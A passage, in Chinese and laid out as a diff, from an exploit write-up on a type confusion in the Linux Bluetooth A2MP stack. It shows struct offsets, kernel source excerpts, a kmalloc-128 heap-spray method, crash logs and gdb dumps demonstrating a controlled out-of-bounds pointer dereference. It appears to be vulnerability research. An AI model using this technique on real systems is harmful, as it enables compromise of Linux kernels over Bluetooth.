@@ -1,0 +1,159 @@
+        if (!sk || !sk_fullsock(sk))
+            return 0;
+        if (sk->sk_family != AF_INET && sk->sk_family != AF_INET6)
+            return 0;
+        ...
+    }
+同样地，`sk_fullsock()` 也会检查一些标志位，没有做任何有趣的事情。进一步探索，注意，为了继续运行 `sk->sk_family` 必须是
+`AF_INET=2` 或者 `AF_INET6=10`。该字段位于 `struct sock` 偏移 0x10 处：
+    // pahole -E -C sock --hex bluetooth.ko
+    struct sock {
+        struct sock_common {
+            ...
+            short unsigned int skc_family;                                           /*  0x10   0x2 */
+            ...
+        } __sk_common; /*     0  0x88 */
+        ...
+        struct sk_filter *         sk_filter;                                            /* 0x110   0x8 */
+        ...
+        /* size: 760, cachelines: 12, members: 88 */
+        /* sum members: 747, holes: 4, sum holes: 8 */
+        /* sum bitfield members: 40 bits (5 bytes) */
+        /* paddings: 1, sum paddings: 4 */
+        /* forced alignments: 1 */
+        /* last cacheline: 56 bytes */
+    } __attribute__((__aligned__(8)));
+观察 `struct amp_mgr` 的偏移 0x10 处，我们认识到该字段映射到了 `struct l2cap_conn` 指针：
+    // pahole -E -C amp_mgr --hex bluetooth.ko
+    struct amp_mgr {
+        ...
+        struct l2cap_conn *        l2cap_conn;                                           /*  0x10   0x8 */
+        ...
+        /* size: 112, cachelines: 2, members: 11 */
+        /* sum members: 110, holes: 1, sum holes: 2 */
+        /* last cacheline: 48 bytes */
+    };
+因为这是一个指向堆对象的指针，堆对象与分配大小对齐（最小 32 字节），这意味着该指针的较低字节不能具有
+`__cgroup_bpf_run_filter_skb()` 所要求的值 2 或 10。经证实，我们知道这个子程序永远返回 0
+无论其他字段有什么值。同样地，子程序 `security_sock_rcv_skb()` 要求相同的条件，否则返回 0 。
+这使得 `sk->sk_filter` 成为唯一可能被污染破坏的成员。我们之后会看到它将会在控制 `struct sk_filter`
+上很有用，但是首先，注意 `sk_filter` 位于偏移 0x110 ，然而 `struct amp_mgr` 的大小只有 112 = 0x70
+字节。难道这不是我们所能控制的吗？既肯定也否定 ——
+通常情况下我们不能控制它，然而如果我们有一个途径去构造堆，这样就很容易完全控制指针了。细致地说，`struct amp_mgr` 大小有 112 字节（在
+65 到 128 之间），因此它被分配在 kmalloc-128 slab 中。通常情况下，在 slab
+的内存块不包含像前面块头一样的元信息，因为目标是最小化碎片。同时，内存块是连续的，因此为了控制位于偏移 0x110
+的指针，我们必须取得一个堆群，那里有我们想要的位于 `struct amp_mgr` 之后第二个块的 0x10 偏移处的指针。
+### 寻找堆原语
+为了能够构造 kmalloc-128 slab，我们需要一个指令能够分配（最好是能够控制）65 —— 128 字节的内存。与其他 L2CAP
+实现不同，Linux 实现中堆的使用非常少。快速搜索 `/net/bluetooth/` 中的 `kmalloc()` 或 `kzalloc()`
+没有什么用 ——
+或者至少没有什么能够控制或以跨过多个命令的形式存在。我们需要的原语是一个可以分配任意字节的内存，并拷贝攻击者控制的数据，在我们释放它之前可以一直保留。
+这听起来像是 `kmemdup()`，对吗？出人意料的是，A2MP 协议恰好给我们提供了这样一个原语。我们可以发起一个
+`A2MP_GETAMPASSOC_RSP` 指令来使用 `kmemdup()` 去复制内存并且保存内存地址于一个控制的结构：
+    // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/a2mp.c
+    static int a2mp_getampassoc_rsp(struct amp_mgr *mgr, struct sk_buff *skb,
+                    struct a2mp_cmd *hdr)
+    {
+        ...
+        u16 len = le16_to_cpu(hdr->len);
+        ...
+        assoc_len = len - sizeof(*rsp);
+        ...
+        ctrl = amp_ctrl_lookup(mgr, rsp->id);
+        if (ctrl) {
+            u8 *assoc;
+            assoc = kmemdup(rsp->amp_assoc, assoc_len, GFP_KERNEL);
+            if (!assoc) {
+                amp_ctrl_put(ctrl);
+                return -ENOMEM;
+            }
+            ctrl->assoc = assoc;
+            ctrl->assoc_len = assoc_len;
+            ctrl->assoc_rem_len = assoc_len;
+            ctrl->assoc_len_so_far = 0;
+            amp_ctrl_put(ctrl);
+        }
+        ...
+    }
+为了让 `amp_ctrl_lookup()` 返回一个控制的结构，我们必须使用 `A2MP_GETINFO_RSP` 指令，将它加入到列表中。
+这几乎是一个完美的堆原语，因为大小和内容可以是任意的！唯一的缺点就是没有合适的原语可以允许我们去释放这些分配的内存。目前看起来只有关闭 HCI
+连接这一条路来实现释放它们，这是一个比较慢的操作。然而，要理解我们如何以一种受控的方式释放分配(例如，释放每秒钟的分配以创建漏洞)，我们需要花费更多的精力去关注内存管理器。注意，当我们将一个新的内存地址存储于
+`ctrl->assoc`
+之中，我们并不释放之前存储在那里的内存块。当我们覆盖它时，这个内存块的内容就会被丢失。为了利用这一行为，我们可以用一个不同大小的分配来重写每一秒的
+`ctrl->assoc`，一旦我们关闭了 HCI 连接，另一半将被释放，而我们覆盖的部分仍然被分配。
+### 控制越界读取
+所以为什么我们想要有一个堆原语？回顾一下这个想法是源自于我们需要构造堆并且实现一个群，其中我们控制的内存块位于距离 `struct amp_mgr`
+对象的一个内存块的位置。通过这种做法，我们可以控制位于偏移 0x110 处的的值，它代表了 `sk_filter`
+指针。因此，当我们触发类型混淆时，我们可以解引用一个任意的指针。
+以下基本技术在使用 SLUB 分配器的 Ubuntu 上可以相当可靠地工作：
+  1. 分配大量大小为 128 字节的对象填充 kmalloc-128 slabs。
+  2. 创建一个新的 A2MP 信道并且希望 `struct amp_mgr` 对象与被喷射对象相邻。
+  3. 触发类型混淆并且实现一次被控的越界读取。
+为了验证我们的堆喷射是成功的，我们首先可以查询 `/proc/slabinfo` 为了获取受害者机器上有关 kmalloc-128 的信息：
+    $ sudo cat /proc/slabinfo
+    slabinfo - version: 2.1
+    # name                 : tunables    : slabdata   
+    ...
+    kmalloc-128         1440   1440    128   32    1 : tunables    0    0    0 : slabdata     45     45      0
+    ...
+在堆喷射之后，我们可以再一次请求，发现 `active_objs` 增加了：
+    $ sudo cat /proc/slabinfo
+    ...
+    kmalloc-128         1760   1760    128   32    1 : tunables    0    0    0 : slabdata     55     55      0
+    ...
+在上面的示例中，我们喷射了 320 个对象。现在如果我们在这些刚被喷射过的对象的周围分配 `struct amp_mgr`
+对象，我们在尝试解引用一个被控的指针（观察 RAX 的值）也许可以触发一个 panic 错误：
+    [   58.881623] general protection fault: 0000 [#1] SMP PTI
+    [   58.881639] CPU: 3 PID: 568 Comm: kworker/u9:1 Not tainted 5.4.0-48-generic #52-Ubuntu
+    [   58.881645] Hardware name: Acer Aspire E5-575/Ironman_SK  , BIOS V1.04 04/26/2016
+    [   58.881705] Workqueue: hci0 hci_rx_work [bluetooth]
+    [   58.881725] RIP: 0010:sk_filter_trim_cap+0x65/0x220
+    [   58.881734] Code: 00 00 4c 89 e6 48 89 df e8 b8 c5 af ff 41 89 c5 85 c0 75 62 48 8b 83 10 01 00 00 48 85 c0 74 56 49 8b 4c 24 18 49 89 5c 24 18  8b 78 18 48 89 4d b0 41 f6 47 02 08 0f 85 41 01 00 00 0f 1f 44
+    [   58.881740] RSP: 0018:ffffbbccc10d3ca0 EFLAGS: 00010202
+    [   58.881748] RAX: 4343434343434343 RBX: ffff96da38f70300 RCX: 0000000000000000
+    [   58.881753] RDX: 0000000000000000 RSI: ffff96da62388300 RDI: ffff96da38f70300
+    [   58.881758] RBP: ffffbbccc10d3d00 R08: ffff96da38f67700 R09: ffff96da68003340
+    [   58.881763] R10: 00000000000301c0 R11: 8075f638da96ffff R12: ffff96da62388300
+    [   58.881767] R13: 0000000000000000 R14: 0000000000000001 R15: 0000000000000008
+    [   58.881774] FS:  0000000000000000(0000) GS:ffff96da69380000(0000) knlGS:0000000000000000
+    [   58.881780] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+    [   58.881785] CR2: 000055f861e4bd20 CR3: 000000024c80a001 CR4: 00000000003606e0
+    [   58.881790] Call Trace:
+    [   58.881869]  ? __l2cap_chan_add+0x88/0x1c0 [bluetooth]
+    [   58.881938]  l2cap_data_rcv+0x351/0x510 [bluetooth]
+    [   58.881995]  l2cap_data_channel+0x29f/0x470 [bluetooth]
+    [   58.882054]  l2cap_recv_frame+0xe5/0x300 [bluetooth]
+    [   58.882067]  ? __switch_to_asm+0x40/0x70
+    [   58.882124]  l2cap_recv_acldata+0x2d2/0x2e0 [bluetooth]
+    [   58.882174]  hci_rx_work+0x186/0x360 [bluetooth]
+    [   58.882187]  process_one_work+0x1eb/0x3b0
+    [   58.882197]  worker_thread+0x4d/0x400
+    [   58.882207]  kthread+0x104/0x140
+    [   58.882215]  ? process_one_work+0x3b0/0x3b0
+    [   58.882223]  ? kthread_park+0x90/0x90
+    [   58.882233]  ret_from_fork+0x35/0x40
+查看受害者机器在 RDI 存储的内存地址指向的空间，我们可以看到：
+    $ sudo gdb /boot/vmlinuz /proc/kcore
+    (gdb) x/40gx 0xffff96da38f70300
+    0xffff96da38f70300: 0xffff96da601e7d00  0xffffffffc0d38760
+    0xffff96da38f70310: 0xffff96da60de2600  0xffff96da61c13400
+    0xffff96da38f70320: 0x0000000000000000  0x0000000000000001
+    0xffff96da38f70330: 0x0000000000000000  0x0000000000000000
+    0xffff96da38f70340: 0xffff96da38f70340  0xffff96da38f70340
+    0xffff96da38f70350: 0x0000000000000000  0x0000000000000000
+    0xffff96da38f70360: 0xffff96da38f70360  0xffff96da38f70360
+    0xffff96da38f70370: 0x0000000000000000  0x0000000000000000
+    0xffff96da38f70380: 0xffffffffffffffff  0xffffffffffffffff
+    0xffff96da38f70390: 0xffffffffffffffff  0xffffffffffffffff
+    0xffff96da38f703a0: 0xffffffffffffffff  0xffffffffffffffff
+    0xffff96da38f703b0: 0xffffffffffffffff  0xffffffffffffffff
+    0xffff96da38f703c0: 0xffffffffffffffff  0xffffffffffffffff
+    0xffff96da38f703d0: 0xffffffffffffffff  0xffffffffffffffff
+    0xffff96da38f703e0: 0xffffffffffffffff  0xffffffffffffffff
+    0xffff96da38f703f0: 0xffffffffffffffff  0xffffffffffffffff
+    0xffff96da38f70400: 0x4141414141414141  0x4242424242424242
+    0xffff96da38f70410: 0x4343434343434343  0x4444444444444444
+    0xffff96da38f70420: 0x4545454545454545  0x4646464646464646
+    0xffff96da38f70430: 0x4747474747474747  0x4848484848484848
+位于 `0xffff96da38f70410` 的值表明了 `sk_filter()` 确实尝试对我们喷射的位于偏移 0x10 的指针解引用，从
+`struct amp_mgr` 看，是位于偏移 0x110。好极了！
